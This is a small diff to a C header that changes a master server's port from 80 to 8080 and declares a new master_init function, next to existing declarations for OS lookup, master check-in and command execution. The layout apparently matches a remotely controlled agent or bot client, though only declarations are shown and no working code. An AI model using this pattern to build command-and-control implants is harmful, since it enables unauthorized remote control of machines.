@@ -1,7 +1,7 @@
 
 #define BUF_SIZE 8192
 #define MASTER_IP "127.0.0.1"
-#define MASTER_PORT 80
+#define MASTER_PORT 8080
 #define MASTER_RECV_SIZE 4096
 #ifdef _WIN32
     #warning "Compiling for Windows!"
@@ -84,5 +84,6 @@
 
 char *get_os();
 int master_checkin(struct sockaddr_in master, char * data);
+int master_init(struct sockaddr_in *master);
 
 char *run_cmd(char *cmd, char **param);
